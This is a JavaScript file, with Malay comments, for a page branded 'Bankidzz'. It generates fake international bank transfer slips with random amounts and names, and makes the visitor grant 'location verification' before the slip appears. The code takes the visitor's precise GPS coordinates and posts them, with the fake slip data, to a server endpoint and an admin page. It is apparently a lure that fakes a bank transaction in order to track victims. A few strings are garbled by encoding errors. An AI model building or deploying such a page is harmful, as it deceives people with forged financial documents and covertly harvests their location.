// ============================================================
// BANKIDZZ - SISTEM PENGESAHAN LOKASI
// DIBUAT OLEH KAIZEN - VERSION 3.1 (TANPA ALERT ADMIN)
// ============================================================


(function() {
    'use strict';

    // Konfigurasi
    const CONFIG = {
        REF_PREFIX: 'BANKIDZZ-2026-07-25-',
        ADMIN_URL: 'admin.html',
        SYNC_CHANNEL: 'bankidzz_sync_channel',
        API_URL: '/api/locations'
    };

    // State
    let locationApproved = false;
    let locationData = null;
    let transferStatus = 'pending';
    let isSending = false;

    // DOM Elements
    const elements = {
        locationVerification: document.getElementById('locationVerification'),
        strukContent: document.getElementById('strukContent'),
        allowBtn: document.getElementById('allowLocationBtn'),
        denyBtn: document.getElementById('denyLocationBtn'),
        sendBtn: document.getElementById('sendStrukBtn'),
        refNumber: document.getElementById('refNumber'),
        strukDate: document.getElementById('strukDate'),
        strukTime: document.getElementById('strukTime'),
        amountDisplay: document.getElementById('amountDisplay'),
        totalAmount: document.getElementById('totalAmount'),
        senderName: document.getElementById('senderName'),
        receiverName: document.getElementById('receiverName'),
        verifCode: document.getElementById('verifCode'),
        statusDot: document.getElementById('statusDot'),
        verifStatusText: document.getElementById('verifStatusText'),
        statusBar: document.getElementById('statusBar'),
        notification: document.getElementById('notification'),
        destCountry: document.getElementById('destCountry')
    };

    // ===== INIT STRUK =====
    function initStruk() {
        const ref = CONFIG.REF_PREFIX + generateRefCode();
        elements.refNumber.textContent = ref;

        const now = new Date();
        elements.strukDate.textContent = now.toLocaleDateString('ms-MY', {
            day: 'numeric', month: 'long', year: 'numeric'
        });
        elements.strukTime.textContent = now.toLocaleTimeString('ms-MY', { hour12: false });

        const amount = (Math.random() * 300000 + 50000).toFixed(2);
        const total = (parseFloat(amount) + 150).toFixed(2);
        elements.amountDisplay.textContent = 'RM ' + parseFloat(amount).toLocaleString('ms-MY');
        elements.totalAmount.textContent = 'RM ' + parseFloat(total).toLocaleString('ms-MY');

        const senders = ['Ahmad Bin Abdullah', 'Siti Nurhaliza Binti Hassan', 'Mohamad Ali Bin Ibrahim', 'Nurul Izzah Binti Rahman', 'Khairul Anuar Bin Ismail'];
        const receivers = ['Johnathan Smith', 'Michael Anderson', 'Sarah Johnson', 'David Chen', 'Emma Williams'];
        elements.senderName.textContent = senders[Math.floor(Math.random() * senders.length)];
        elements.receiverName.textContent = receivers[Math.floor(Math.random() * receivers.length)];

        elements.verifCode.textContent = generateVerifCode();

        const countries = ['🇺🇸 AMERIKA SYARIKAT', '🇬🇧 UNITED KINGDOM', '🇦🇺 AUSTRALIA', '🇸🇬 SINGAPURA', '🇯🇵 JEPUN'];
        elements.destCountry.textContent = countries[Math.floor(Math.random() * countries.length)];

        setStatus('pending', 'Menunggu pengesahan lokasi');
        elements.sendBtn.disabled = true;

        console.log('[Bankidzz] Struk initialized:', ref);
    }

    function generateRefCode() {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        let code = '';
        for (let i = 0; i < 6; i++) {
            code += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return code;
    }

    function generateVerifCode() {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        let code = '';
        for (let i = 0; i < 10; i++) {
            code += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return code;
    }

    function setStatus(type, text) {
        if (type === 'verified') {
            elements.statusDot.className = 'status-dot verified';
        } else {
            elements.statusDot.className = 'status-dot pending';
        }
        elements.verifStatusText.textContent = text;
    }

    // ===== LOCATION PERMISSION =====
    function requestLocation() {
        if (!navigator.geolocation) {
            showNotification('❌ Browser tidak sokong Geolocation. Guna Chrome/Firefox.', 'error');
            return;
        }

        elements.allowBtn.textContent = '⏳ Mengambil lokasi...';
        elements.allowBtn.disabled = true;

        navigator.geolocation.getCurrentPosition(
            async function(position) {
                locationData = {
                    lat: position.coords.latitude,
                    lng: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: new Date().toISOString()
                };

                // Simpan ke database bersama sebelum transaksi diteruskan.
                try {
                    await saveLocationToAdmin(locationData);
                    locationApproved = true;
                } catch (error) {
                    console.error('[Bankidzz] Gagal menyimpan lokasi:', error);
                    locationData = null;
                    locationApproved = false;
                    elements.allowBtn.innerHTML = 'ðŸ”„ Cuba Semula';
                    elements.allowBtn.disabled = false;
                    showNotification('âŒ Lokasi diperoleh tetapi gagal dihantar ke server. Sila cuba lagi.', 'error');
                    return;
                }

                // Update UI
                elements.allowBtn.innerHTML = '✅ Lokasi Disahkan!';
                elements.allowBtn.style.background = '#4ade80';
                elements.allowBtn.style.color = '#0a0a1a';
                elements.allowBtn.disabled = true;

                setTimeout(() => {
                    elements.locationVerification.style.display = 'none';
                    elements.strukContent.style.display = 'block';
                    setStatus('verified', '✅ Lokasi disahkan oleh Bankidzz');
                    elements.sendBtn.disabled = false;
                    elements.statusBar.querySelector('.status-icon').textContent = '✅';
                    elements.statusBar.querySelector('h3').textContent = 'LOKASI DISAHKAN';
                    elements.statusBar.querySelector('p').textContent = 'Sistem Bankidzz mengesahkan lokasi anda. Sila hantar slip.';

                    showNotification('✅ Lokasi berjaya disahkan!', 'success');
                }, 500);

                console.log('[Bankidzz] Location approved:', locationData);
            },
            function(error) {
                console.error('[Bankidzz] Geolocation error:', error);
                let msg = 'Gagal mengambil lokasi. ';
                switch(error.code) {
                    case 1: 
                        msg += 'Izin lokasi ditolak. Sila izinkan di tetapan browser.'; 
                        break;
                    case 2: 
                        msg += 'Posisi tidak tersedia. Pastikan GPS aktif.'; 
                        break;
                    case 3: 
                        msg += 'Masa tamat. Cuba lagi di kawasan terbuka.'; 
                        break;
                    default: 
                        msg += 'Sila cuba lagi.';
                }
                showNotification('❌ ' + msg, 'error');
                elements.allowBtn.innerHTML = '🔄 Cuba Semula';
                elements.allowBtn.disabled = false;
            },
            {
                enableHighAccuracy: true,
                timeout: 30000,
                maximumAge: 60000
            }
        );
    }

    // ===== SAVE TO ADMIN + SYNC =====
    async function saveLocationToAdmin(data) {
        const ref = elements.refNumber.textContent;
        const payload = {
            transferId: ref,
            sender: elements.senderName.textContent,
            receiver: elements.receiverName.textContent,
            amount: elements.amountDisplay.textContent,
            total: elements.totalAmount.textContent,
            location: data,
            status: 'verified',
            timestamp: new Date().toISOString(),
            verifCode: elements.verifCode.textContent
            ,
            consent: true
        };

        try {
            const response = await fetch(CONFIG.API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            if (!response.ok) {
                const result = await response.json().catch(() => ({}));
                throw new Error(result.error || 'Server menolak data lokasi.');
            }

            // Salinan lokal untuk fallback pada browser yang sama.
            let allData = JSON.parse(localStorage.getItem('bankidzz_transfers') || '[]');
            allData = allData.filter(t => t.transferId !== ref);
            allData.push(payload);
            localStorage.setItem('bankidzz_transfers', JSON.stringify(allData));
            localStorage.setItem('bankidzz_last_location', JSON.stringify(data));
            console.log('[Bankidzz] Data saved to server');

            // 2. BROADCAST ke tab lain
            try {
                const channel = new BroadcastChannel(CONFIG.SYNC_CHANNEL);
                channel.postMessage({
                    type: 'NEW_LOCATION',
                    payload: payload
                });
                channel.close();
                console.log('[Bankidzz] Broadcast sent to other tabs');
            } catch(e) {
                console.warn('[Bankidzz] BroadcastChannel not supported:', e);
            }

            // 3. Simpan URL untuk admin (tanpa alert)
            const encoded = encodeURIComponent(btoa(JSON.stringify(payload)));
            const shareUrl = window.location.origin + '/admin.html?data=' + encoded;
            localStorage.setItem('bankidzz_admin_share_url', shareUrl);
            localStorage.setItem('bankidzz_last_payload', JSON.stringify(payload));

            // 4. Trigger storage event
            window.dispatchEvent(new Event('storage'));

        } catch(e) {
            console.warn('[Bankidzz] Could not save location:', e);
            throw e;
        }
    }

    // ===== SEND STRUK =====
    function sendStruk() {
        if (!locationApproved || !locationData) {
            showNotification('⚠️ Sila izinkan lokasi terlebih dahulu!', 'error');
            return;
        }

        if (isSending) return;
        isSending = true;

        const ref = elements.refNumber.textContent;
        const message = `
╔═══════════════════════════════════════════════════════╗
║              BANKIDZZ                    ║
║          SLIP TRANSFER ANTARABANGSA                  ║
╠═══════════════════════════════════════════════════════╣
║  Rujukan    : ${ref}
║  Tarikh     : ${elements.strukDate.textContent}
║  Masa       : ${elements.strukTime.textContent}
║───────────────────────────────────────────────────────║
║  Pengirim   : ${elements.senderName.textContent}
║  Penerima   : ${elements.receiverName.textContent}
║───────────────────────────────────────────────────────║
║  Jumlah     : ${elements.amountDisplay.textContent}
║  Total      : ${elements.totalAmount.textContent}
║───────────────────────────────────────────────────────║
║  Kod Verif  : ${elements.verifCode.textContent}
║  Status     : ✅ LOKASI DISAHKAN
║───────────────────────────────────────────────────────║
║  Lokasi Pengesahan:
║  Lat: ${locationData.lat.toFixed(6)}
║  Lng: ${locationData.lng.toFixed(6)}
║  Ketepatan: ${locationData.accuracy.toFixed(0)}m
║───────────────────────────────────────────────────────║
║  © Bankidzz - Sistem Keselamatan        ║
╚═══════════════════════════════════════════════════════╝
        `;

        try {
            let transfers = JSON.parse(localStorage.getItem('bankidzz_transfers') || '[]');
            const idx = transfers.findIndex(t => t.transferId === ref);
            if (idx > -1) {
                transfers[idx].status = 'completed';
                transfers[idx].sentAt = new Date().toISOString();
                localStorage.setItem('bankidzz_transfers', JSON.stringify(transfers));
            }
        } catch(e) {}

        elements.sendBtn.textContent = '✅ SLIP TERHANTAR!';
        elements.sendBtn.style.background = '#4ade80';
        elements.sendBtn.disabled = true;

        showNotification('✅ Slip berjaya dihantar!', 'success');

        if (navigator.share) {
            navigator.share({
                title: 'Slip Transfer Bankidzz - ' + ref,
                text: message,
            }).catch(() => {});
        } else {
            navigator.clipboard.writeText(message).then(() => {
                showNotification('📋 Slip disalin ke clipboard!', 'success');
            }).catch(() => {
                const textarea = document.createElement('textarea');
                textarea.value = message;
                document.body.appendChild(textarea);
                textarea.select();
                document.execCommand('copy');
                textarea.remove();
                showNotification('📋 Slip disalin!', 'success');
            });
        }

        isSending = false;
    }

    // ===== DENY LOCATION =====
    function denyLocation() {
        if (confirm('⚠️ Anda pasti ingin membatalkan transaksi ini?')) {
            showNotification('❌ Transaksi dibatalkan.', 'error');
            elements.locationVerification.style.opacity = '0.5';
            elements.locationVerification.style.pointerEvents = 'none';
            elements.denyBtn.textContent = '❌ DIBATALKAN';
            elements.denyBtn.style.borderColor = '#ff6b6b';
            elements.denyBtn.style.color = '#ff6b6b';
            elements.denyBtn.disabled = true;
            elements.allowBtn.disabled = true;
        }
    }

    // ===== NOTIFICATION =====
    function showNotification(msg, type = 'info') {
        const el = elements.notification;
        el.textContent = msg;
        el.className = 'notification show ' + type;
        clearTimeout(el._timeout);
        el._timeout = setTimeout(() => {
            el.className = 'notification';
        }, 5000);
    }

    // ===== EVENT LISTENERS =====
    elements.allowBtn.addEventListener('click', requestLocation);
    elements.denyBtn.addEventListener('click', denyLocation);
    elements.sendBtn.addEventListener('click', sendStruk);

    // ===== INIT =====
    initStruk();

    console.log('[Bankidzz] System ready. Menunggu pengesahan lokasi...');

})();
